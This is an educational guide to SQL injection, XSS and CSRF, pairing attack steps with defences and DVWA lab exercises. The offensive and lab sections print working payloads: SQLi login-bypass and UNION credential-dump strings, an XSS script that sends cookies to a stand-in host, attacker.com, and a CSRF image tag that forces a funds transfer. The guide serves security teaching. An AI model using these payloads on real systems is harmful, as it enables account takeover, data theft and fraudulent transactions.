# Web Application Attacks: SQL Injection (SQLi), XSS, CSRF

This guide provides detailed practical scenarios for three common web application attacks — **SQL Injection (SQLi)**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)**, covering both offensive and defensive techniques, along with hands-on examples.

---

## 1. SQL Injection (SQLi)

### Practical Scenario:
An attacker targets an e-commerce website’s login form. By injecting malicious SQL queries, the attacker bypasses authentication and gains unauthorized access to the admin panel.

---

### Offensive Perspective (How to Attack)

1. **Identify Vulnerable Input Fields**:
   - The attacker targets input fields such as login forms or search boxes. They try inserting special characters like `’` or `;` to test the vulnerability.

2. **Test for SQL Vulnerability**:
   - By inserting test characters such as `’`, the attacker tries to trigger SQL errors, indicating the potential for injection.
   - Example:  
     ```sql
     ' OR 1=1; --
     ```
   - This query tricks the database into allowing login without valid credentials.

3. **Exploit the Vulnerability**:
   - The attacker crafts complex SQL queries to extract or manipulate data.
   - Example:  
     ```sql
     ' UNION SELECT username, password FROM users; --
     ```

4. **Gain Full Control**:
   - The attacker can dump the database, modify data, or escalate privileges to gain complete control over the system.

---

### Defensive Perspective (How to Prevent SQLi)

1. **Use Prepared Statements**:
   - Always use **prepared statements** with parameterized queries to avoid SQL injection.
   - Example:  
     ```php
     $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
     $stmt->execute([$username, $password]);
     ```

2. **Input Validation and Sanitization**:
   - Sanitize user inputs and remove dangerous characters like `'`, `;`, or `--`.

3. **Use ORM (Object-Relational Mapping)**:
   - Use ORM frameworks that abstract raw SQL queries, protecting against SQL injection.

4. **Limit Database Privileges**:
   - Follow the **principle of least privilege** by limiting the database permissions available to the web application.

5. **Web Application Firewalls (WAF)**:
   - Use **WAF** to detect and block SQL injection attempts.

---

### Hands-On Example: SQL Injection

1. **Set Up a Vulnerable Web Application**:
   - Install **DVWA (Damn Vulnerable Web Application)** or **SQLi Labs** for SQL injection testing.

2. **Test for SQLi**:
   - Inject the following into the login form to test for SQLi vulnerability:  
     ```sql
     ' OR 1=1; --
     ```

3. **Exploit SQL Injection**:
   - Use SQL queries to extract data:  
     ```sql
     ' UNION SELECT username, password FROM users; --
     ```

4. **Mitigation**:
   - Implement **prepared statements** and sanitize inputs to fix the vulnerability.

---

## 2. Cross-Site Scripting (XSS)

### Practical Scenario:
An attacker injects a malicious JavaScript payload into a user comment form on a blog. When other users view the blog post, the malicious script runs, stealing session cookies.

---

### Offensive Perspective (How to Attack)

1. **Identify Injection Points**:
   - The attacker finds input fields that are reflected back on the page, such as comment forms.

2. **Inject Malicious Script**:
   - The attacker injects a script that will execute when the page is loaded.
   - Example:  
     ```html
     <script>alert('XSS');</script>
     ```

3. **Steal Session Cookies**:
   - The attacker can steal session cookies using a script like:
     ```html
     <script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
     ```

4. **Escalate Privileges**:
   - Once the session cookie is captured, the attacker can hijack the user’s session and gain access to their account.

---

### Defensive Perspective (How to Prevent XSS)

1. **Sanitize and Escape User Input**:
   - Ensure all user inputs are sanitized and properly escaped.

2. **Content Security Policy (CSP)**:
   - Implement a **Content Security Policy (CSP)** to limit the execution of scripts from untrusted sources.

3. **Use HTTP-Only Cookies**:
   - Use **HTTPOnly** cookies to prevent JavaScript from accessing session cookies.

4. **Input Validation**:
   - Validate all user inputs, restricting the allowed characters.

---

### Hands-On Example: XSS

1. **Set Up a Vulnerable Web Application**:
   - Use **DVWA** or **XSS Labs** to test for XSS vulnerabilities.

2. **Test for XSS**:
   - Inject the following script into a comment form:  
     ```html
     <script>alert('XSS');</script>
     ```

3. **Exploit XSS with Cookie Theft**:
   - Inject the following script to steal cookies:  
     ```html
     <script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
     ```

4. **Mitigation**:
   - Sanitize inputs and implement **CSP**.

---

## 3. Cross-Site Request Forgery (CSRF)

### Practical Scenario:
An attacker sends a malicious link to a logged-in user of a banking website. Clicking the link sends a request to transfer funds to the attacker’s account without the user’s knowledge.

---

### Offensive Perspective (How to Attack)

1. **Identify Vulnerable Actions**:
   - The attacker finds a vulnerable action such as fund transfers or password changes that are triggered by GET/POST requests.

2. **Craft a Malicious Link or Form**:
   - The attacker creates a link that automatically submits a request.
   - Example:  
     ```html
     <img src="http://bank.com/transfer?amount=1000&to=attacker_account">
     ```

3. **Trick the Victim**:
   - The attacker sends the malicious link to the victim via email or embeds it on a webpage.

---

### Defensive Perspective (How to Prevent CSRF)

1. **Use Anti-CSRF Tokens**:
   - Include **CSRF tokens** in all sensitive requests.

2. **Validate Origin of Requests**:
   - Check the **Referer** and **Origin** headers for trusted sources.

3. **Use SameSite Cookies**:
   - Set **SameSite** cookies to prevent them from being sent with cross-site requests.

---

### Hands-On Example: CSRF

1. **Set Up a Vulnerable Web Application**:
   - Use **DVWA** or **CSRF Labs** for testing CSRF vulnerabilities.

2. **Test CSRF Attack**:
   - Create a malicious link or form that automatically transfers funds when clicked.

3. **Mitigation**:
   - Implement **CSRF tokens** and validate request origins.

## Conclusion

The **OWASP Top 10** highlights web application vulnerabilities like **SQL Injection (SQLi)**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)**. Understanding these vulnerabilities, offensive tactics, and defensive strategies is crucial to building secure web applications.
